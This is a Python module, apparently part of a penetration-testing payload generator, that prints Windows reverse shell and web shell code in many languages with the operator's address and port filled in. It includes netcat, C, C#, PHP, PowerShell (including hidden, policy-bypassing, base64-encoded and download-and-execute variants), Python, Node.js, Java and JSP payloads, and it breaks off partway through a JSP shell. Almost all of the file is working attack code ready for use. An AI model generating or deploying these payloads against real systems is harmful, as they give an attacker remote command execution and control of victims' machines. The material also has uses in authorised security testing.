from core.core import *
import sys
import base64

class reverse_windows():
	def __init__(self,lport='',lhost='',shell='',payload=''):
		self.shell=shell
		self.lhost=lhost
		self.lport=lport
		self.payload=payload

	def main(self):
		payloads=['all','netcat','c','c#','php','powershell','python','python3','nodejs','java','javascript','groovy','lua','golang','dart']

		if not self.payload in payloads:
			print(f'{TerminalColor.Red}Invalid payload{TerminalColor.Reset}')


		print(f'{TerminalColor.Orange}######## WINDOWS ########{TerminalColor.Reset}')

		if self.payload=='all' or self.payload=='netcat':
			print(self.netcat())

		if self.payload=='all' or self.payload=='c' or self.payload=='c#':
			print(self.c())

		if self.payload=='all' or self.payload=='php':
			print(self.php())

		if self.payload=='all' or self.payload=='powershell':
			print(self.powershell())

		if self.payload=='all' or self.payload=='python' or self.payload=='python3':
			print(self.python())

		if self.payload=='all' or self.payload=='nodejs':
			print(self.nodejs())

		if self.payload=='all' or self.payload=='java':
			print(self.java())

		if self.payload=='all' or self.payload=='javascript':
			print(self.javascript())

		if self.payload=='all' or self.payload=='groovy':
			print(self.groovy())

		if self.payload=='all' or self.payload=='lua':
			print(self.lua())

		if self.payload=='all' or self.payload=='golang':
			print(self.golang())

		if self.payload=='all' or self.payload=='dart':
			print(self.dart())

	def netcat(self):
		return f'''
{TerminalColor.Orange}#NC.EXE -e
{TerminalColor.Cyan}nc.exe {TerminalColor.Green}{self.lhost}{TerminalColor.Cyan} {TerminalColor.Green}{self.lport}{TerminalColor.Cyan} -e {TerminalColor.Green}{self.shell}{TerminalColor.Cyan}

{TerminalColor.Orange}#NCAT.exe -e
{TerminalColor.Cyan}ncat.exe {TerminalColor.Green}{self.lhost}{TerminalColor.Cyan} {TerminalColor.Green}{self.lport}{TerminalColor.Cyan} -e {TerminalColor.Green}{self.shell}{TerminalColor.Cyan}


		'''

	def c(self):
		return f'''
{TerminalColor.Orange}#C WINDOWS
{TerminalColor.Cyan}#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32")

WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax; 
char ip_addr[16] = "{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}"; 
char port[6] = "{TerminalColor.Green}{self.lport}{TerminalColor.Cyan}";            

STARTUPINFO ini_processo;

PROCESS_INFORMATION processo_info;

int main()'''+'''
{
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);


    struct hostent *host; 
    host = gethostbyname(ip_addr);
    strcpy_s(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));

    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi(port));
    hax.sin_addr.s_addr = inet_addr(ip_addr);

    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

    TCHAR cmd[255] = TEXT("cmd.exe");

    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

    return 0;
}'''+f'''

{TerminalColor.Orange}#C# TCP CLIENT
{TerminalColor.Cyan}using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack'''+'''
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{'''+f'''
			using(TcpClient client = new TcpClient("{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}", {TerminalColor.Green}{self.lport}{TerminalColor.Cyan}))'''+'''
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);
						
						StringBuilder strInput = new StringBuilder();

						Process p = new Process();'''+f'''
						p.StartInfo.FileName = "{TerminalColor.Green}{self.shell}{TerminalColor.Cyan}";'''+'''
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}'''+f'''

{TerminalColor.Orange}#C# BASH -i
{TerminalColor.Cyan}using System;
using System.Diagnostics;

namespace BackConnect '''+'''{
  class ReverseBash {
	public static void Main(string[] args) {
	  Process proc = new System.Diagnostics.Process();'''+f'''
	  proc.StartInfo.FileName = "{TerminalColor.Green}{self.shell}{TerminalColor.Cyan}";
	  proc.StartInfo.Arguments = "-c \\"cmd -i >& /dev/tcp/{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}/{TerminalColor.Green}{self.lport}{TerminalColor.Cyan} 0>&1\"";
	  proc.StartInfo.UseShellExecute = false;
	  proc.StartInfo.RedirectStandardOutput = true;
	  proc.Start();'''+'''

	  while (!proc.StandardOutput.EndOfStream) {
		Console.WriteLine(proc.StandardOutput.ReadLine());
	  }
	}
  }
}'''


	def php(self):
		return f'''
{TerminalColor.Orange}#PHP PENTERMONKEY
{TerminalColor.Cyan}<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}';
$port = {TerminalColor.Green}{self.lport}{TerminalColor.Cyan};
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; {TerminalColor.Green}{self.shell}{TerminalColor.Cyan} -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork'))'''+''' {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\\n";
	}
}

?>'''+f'''

{TerminalColor.Orange}#PHP IVAN SINCEK
{TerminalColor.Cyan}<?php
// Copyright (c) 2020 Ivan Sincek
// v2.3
// Requires PHP v5.0.0 or greater.
// Works on Linux OS, macOS, and Windows OS.
// See the original script at https://github.com/pentestmonkey/php-reverse-shell.'''+'''
class Shell {
    private $addr  = null;
    private $port  = null;
    private $os    = null;
    private $shell = null;
    private $descriptorspec = array(
        0 => array('pipe', 'r'), // shell can read from STDIN
        1 => array('pipe', 'w'), // shell can write to STDOUT
        2 => array('pipe', 'w')  // shell can write to STDERR
    );
    private $buffer  = 1024;    // read/write buffer size
    private $clen    = 0;       // command length
    private $error   = false;   // stream read/write error
    public function __construct($addr, $port) {
        $this->addr = $addr;
        $this->port = $port;
    }
    private function detect() {
        $detected = true;
        if (stripos(PHP_OS, 'LINUX') !== false) { // same for macOS
            $this->os    = 'LINUX';
            $this->shell = 'cmd';
        } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {
            $this->os    = 'WINDOWS';
            $this->shell = 'cmd.exe';
        } else {
            $detected = false;
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\\n";
        }
        return $detected;
    }
    private function daemonize() {
        $exit = false;
        if (!function_exists('pcntl_fork')) {
            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\\n";
        } else if (($pid = @pcntl_fork()) < 0) {
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\\n";
        } else if ($pid > 0) {
            $exit = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\\n";
        } else if (posix_setsid() < 0) {
            // once daemonized you will actually no longer see the script's dump
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\\n";
        } else {
            echo "DAEMONIZE: Completed successfully!\\n";
        }
        return $exit;
    }
    private function settings() {
        @error_reporting(0);
        @set_time_limit(0); // do not impose the script execution time limit
        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories
    }
    private function dump($data) {
        $data = str_replace('<', '&lt;', $data);
        $data = str_replace('>', '&gt;', $data);
        echo $data;
    }
    private function read($stream, $name, $buffer) {
        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot read from ${name}, script will now exit...\\n";
        }
        return $data;
    }
    private function write($stream, $name, $data) {
        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot write to ${name}, script will now exit...\\n";
        }
        return $bytes;
    }
    // read/write method for non-blocking streams
    private function rw($input, $output, $iname, $oname) {
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length
            $this->dump($data); // script's dump
        }
    }
    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
    // we must read the exact byte length from a stream and not a single byte more
    private function brw($input, $output, $iname, $oname) {
        $fstat = fstat($input);
        $size = $fstat['size'];
        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
            // for some reason Windows OS pipes STDIN into STDOUT
            // we do not like that
            // we need to discard the data from the stream
            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
                $this->clen -= $bytes;
                $size -= $bytes;
            }
        }
        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
            $size -= $bytes;
            $this->dump($data); // script's dump
        }
    }
    public function run() {
        if ($this->detect() && !$this->daemonize()) {
            $this->settings();

            // ----- SOCKET BEGIN -----
            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
            if (!$socket) {
                echo "SOC_ERROR: {$errno}: {$errstr}\\n";
            } else {
                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS

                // ----- SHELL BEGIN -----
                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
                if (!$process) {
                    echo "PROC_ERROR: Cannot start the shell\\n";
                } else {
                    foreach ($pipes as $pipe) {
                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
                    }

                    // ----- WORK BEGIN -----
                    $status = proc_get_status($process);
                    @fwrite($socket, "SOCKET: Shell has connected! PID: " . $status['pid'] . "\\n");
                    do {
						$status = proc_get_status($process);
                        if (feof($socket)) { // check for end-of-file on SOCKET
                            echo "SOC_ERROR: Shell connection has been terminated\\n"; break;
                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
                            echo "PROC_ERROR: Shell process has been terminated\\n";   break; // feof() does not work with blocking streams
                        }                                                                    // use proc_get_status() instead
                        $streams = array(
                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
                            'write'  => null,
                            'except' => null
                        );
                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS
                        if ($num_changed_streams === false) {
                            echo "STRM_ERROR: stream_select() failed\\n"; break;
                        } else if ($num_changed_streams > 0) {
                            if ($this->os === 'LINUX') {
                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            } else if ($this->os === 'WINDOWS') {
                                // order is important
                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            }
                        }
                    } while (!$this->error);
                    // ------ WORK END ------

                    foreach ($pipes as $pipe) {
                        fclose($pipe);
                    }
                    proc_close($process);
                }
                // ------ SHELL END ------

                fclose($socket);
            }
            // ------ SOCKET END ------

        }
    }
}
echo '<pre>';
// change the host address and/or port number as necessary'''+f'''
$sh = new Shell('{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}', {TerminalColor.Green}{self.lport}{TerminalColor.Cyan});
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>'''+f'''

{TerminalColor.Orange}#PHP CMD
{TerminalColor.Cyan}<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))'''+'''
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>'''+f'''

{TerminalColor.Orange}#PHP CMD 2
{TerminalColor.Cyan}<?php if(isset($_REQUEST['cmd']))'''+'''{ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>'''+f'''

{TerminalColor.Orange}#PHP CMD SMALL
{TerminalColor.Cyan}<?=`$_GET[0]`?>

{TerminalColor.Orange}#PHP SYSTEM
{TerminalColor.Cyan}php -r '$sock=fsockopen("{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}",{TerminalColor.Green}{self.lport}{TerminalColor.Cyan});system("{TerminalColor.Green}{self.shell}{TerminalColor.Cyan} <&3 >&3 2>&3");'

{TerminalColor.Orange}#PHP`
{TerminalColor.Cyan}php -r '$sock=fsockopen("{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}",{TerminalColor.Green}{self.lport}{TerminalColor.Cyan});`{TerminalColor.Green}{self.shell}{TerminalColor.Cyan} <&3 >&3 2>&3`;'

{TerminalColor.Orange}#PHP POPEN
{TerminalColor.Cyan}php -r '$sock=fsockopen("{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}",{TerminalColor.Green}{self.lport}{TerminalColor.Cyan});popen("{TerminalColor.Green}{self.shell}{TerminalColor.Cyan} <&3 >&3 2>&3", "r");'

{TerminalColor.Orange}#PHP PROC_OPEN
{TerminalColor.Cyan}php -r '$sock=fsockopen("{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}",{TerminalColor.Green}{self.lport}{TerminalColor.Cyan});$proc=proc_open("{TerminalColor.Green}{self.shell}{TerminalColor.Cyan}", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'

		'''

	def ConvertBase64(self,text=""):
		message_bytes = text.encode('ascii')
		base64_bytes = base64.b64encode(message_bytes)
		base64_message = base64_bytes.decode('ascii')

		return base64_message

	def powershell(self):
		powershell_3_base64=f'''$TCPClient = New-Object Net.Sockets.TCPClient('{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}', {TerminalColor.Green}{self.lport}{TerminalColor.Cyan});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String)'''+''' {[byte[]]$script:Buffer ='''+''' 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, '''+'''0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()'''
		return f'''
{TerminalColor.Orange}#WINDOWS CONPTY
{TerminalColor.Cyan}IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {TerminalColor.Green}{self.lhost}{TerminalColor.Cyan} {TerminalColor.Green}{self.lport}{TerminalColor.Cyan}

{TerminalColor.Orange}#POWERSHELL #1
{TerminalColor.Cyan}powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}",{TerminalColor.Green}{self.lport}{TerminalColor.Cyan});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%'''+'''{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
'''+f'''
{TerminalColor.Orange}#POWERSHELL #2
{TerminalColor.Cyan}powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}',{TerminalColor.Green}{self.lport}{TerminalColor.Cyan});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%'''+'''{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
'''+f'''
{TerminalColor.Orange}#POWERSHELL #3
{TerminalColor.Cyan}powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}', {TerminalColor.Green}{self.lport}{TerminalColor.Cyan});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String)'''+''' {[byte[]]$script:Buffer ='''+''' 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, '''+'''0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
'''+f'''
{TerminalColor.Orange}#POWERSHELL #4 (TLS)
{TerminalColor.Cyan}powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}', {TerminalColor.Green}{self.lport}{TerminalColor.Cyan});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,('''+'''{$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize '''+'''| % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead -'''+''' 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
'''+f'''
{TerminalColor.Orange}#POWERSHELL #3 (BASE 64)
{TerminalColor.Cyan}powershell -e {self.ConvertBase64(powershell_3_base64)}
	'''

	def python(self):
		return f'''
{TerminalColor.Orange}#PYTHON3 WINDOWS
{TerminalColor.Cyan}import os,socket,subprocess,threading;
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}",{TerminalColor.Green}{self.lport}{TerminalColor.Cyan}))

p=subprocess.Popen(["{TerminalColor.Green}{self.shell}{TerminalColor.Cyan}"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()
		'''

	def nodejs(self):
		return f'''
{TerminalColor.Orange}#NODEJS
{TerminalColor.Cyan}(function()'''+'''{
    var net = require("net"),
        cp = require("child_process"),'''+f'''
        sh = cp.spawn("{TerminalColor.Green}{self.shell}{TerminalColor.Cyan}", []);
    var client = new net.Socket();
    client.connect({TerminalColor.Green}{self.lport}{TerminalColor.Cyan}, "{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}", function()'''+'''{
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
		'''

	def java(self):
		return f'''
{TerminalColor.Orange}#JAVA #3
{TerminalColor.Cyan}import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;'''+'''

public class shell {
    public static void main(String[] args) {'''+f'''
        String host = "{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}";
        int port = {TerminalColor.Green}{self.lport}{TerminalColor.Cyan};
        String cmd = "{TerminalColor.Green}{self.shell}{TerminalColor.Cyan}";'''+'''
        try {
            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s = new Socket(host, port);
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while (!s.isClosed()) {
                while (pi.available() > 0)
                    so.write(pi.read());
                while (pe.available() > 0)
                    so.write(pe.read());
                while (si.available() > 0)
                    po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) {}
            }
            p.destroy();
            s.close();
        } catch (Exception e) {}
    }
}'''+f'''

{TerminalColor.Orange}#JAVA WEB
{TerminalColor.Cyan}<%@
page import="java.lang.*, java.util.*, java.io.*, java.net.*"
% >
<%!
static class StreamConnector extends Thread'''+'''
{
        InputStream is;
        OutputStream os;
        StreamConnector(InputStream is, OutputStream os)
        {
                this.is = is;
                this.os = os;
        }
        public void run()
        {
                BufferedReader isr = null;
                BufferedWriter osw = null;
                try
                {
                        isr = new BufferedReader(new InputStreamReader(is));
                        osw = new BufferedWriter(new OutputStreamWriter(os));
                        char buffer[] = new char[8192];
                        int lenRead;
                        while( (lenRead = isr.read(buffer, 0, buffer.length)) > 0)
                        {
                                osw.write(buffer, 0, lenRead);
                                osw.flush();
                        }
                }
                catch (Exception ioe)
                try
                {
                        if(isr != null) isr.close();
                        if(osw != null) osw.close();
                }
                catch (Exception ioe)
        }
}
%>

<h1>JSP Backdoor Reverse Shell</h1>

<form method="post">
IP Address
<input type="text" name="ipaddress" size=30>
Port
<input type="text" name="port" size=10>
<input type="submit" name="Connect" value="Connect">
</form>
<p>
<hr>

<%
String ipAddress = request.getParameter("ipaddress");
String ipPort = request.getParameter("port");
if(ipAddress != null && ipPort != null)
{
        Socket sock = null;
        try
        {
                sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());
                Runtime rt = Runtime.getRuntime();
                Process proc = rt.exec("cmd.exe");
                StreamConnector outputConnector =
                        new StreamConnector(proc.getInputStream(),
                                          sock.getOutputStream());
                StreamConnector inputConnector =
                        new StreamConnector(sock.getInputStream(),
                                          proc.getOutputStream());
                outputConnector.start();
                inputConnector.start();
        }
        catch(Exception e) 
}
%>'''+f'''

{TerminalColor.Orange}#JAVA TWO WAY
{TerminalColor.Cyan}<%
    /*
     * Usage: This is a 2 way shell, one web shell and a reverse shell. First, it will try to connect to a listener (atacker machine), with the IP and Port specified at the end of the file.
     * If it cannot connect, an HTML will prompt and you can input commands (sh/cmd) there and it will prompts the output in the HTML.
     * Note that this last functionality is slow, so the first one (reverse shell) is recommended. Each time the button "send" is clicked, it will try to connect to the reverse shell again (apart from executing 
     * the command specified in the HTML form). This is to avoid to keep it simple.
     */
%>

<%@page import="java.lang.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>
<%@page import="java.util.*"%>

<html>
<head>
    <title>jrshell</title>
</head>
<body>
<form METHOD="POST" NAME="myform" ACTION="">
    <input TYPE="text" NAME="shell">
    <input TYPE="submit" VALUE="Send">
</form>
<pre>
<%
    // Define the OS
    String shellPath = null;
    try'''+'''
    {
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
            shellPath = new String("/bin/sh");
        } else {
            shellPath = new String("cmd.exe");
        }
    } catch( Exception e ){}
    // INNER HTML PART
    if (request.getParameter("shell") != null) {
        out.println("Command: " + request.getParameter("shell") + "\n<BR>");
        Process p;
        if (shellPath.equals("cmd.exe"))
            p = Runtime.getRuntime().exec("cmd.exe /c " + request.getParameter("shell"));
        else
            p = Runtime.getRuntime().exec("/bin/sh -c " + request.getParameter("shell"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
            out.println(disr);
            disr = dis.readLine();
        }
    }
    // TCP PORT PART
    class StreamConnector extends Thread
    {
        InputStream wz;
        OutputStream yr;
        StreamConnector( InputStream wz, OutputStream yr ) {
            this.wz = wz;
            this.yr = yr;
        }
        public void run()
        {
            BufferedReader r  = null;
            BufferedWriter w = null;
            try
            {
                r  = new BufferedReader(new InputStreamReader(wz));
                w = new BufferedWriter(new OutputStreamWriter(yr));
                char buffer[] = new char[8192];
                int length;
                while( ( length = r.read( buffer, 0, buffer.length ) ) > 0 )
                {
                    w.write( buffer, 0, length );
                    w.flush();
                }
            } catch( Exception e ){}
            try
            {
                if( r != null )
                    r.close();
                if( w != null )
                    w.close();
            } catch( Exception e ){}
        }
    }
 
    try {'''+f'''
        Socket socket = new Socket( "{TerminalColor.Green}{self.lhost}{TerminalColor.Cyan}", {TerminalColor.Green}{self.lport}{TerminalColor.Cyan} ); // Replace with wanted ip and port
        Process process = Runtime.getRuntime().exec( shellPath );'''+'''
        new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();
        new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();
        out.println("port opened on " + socket);
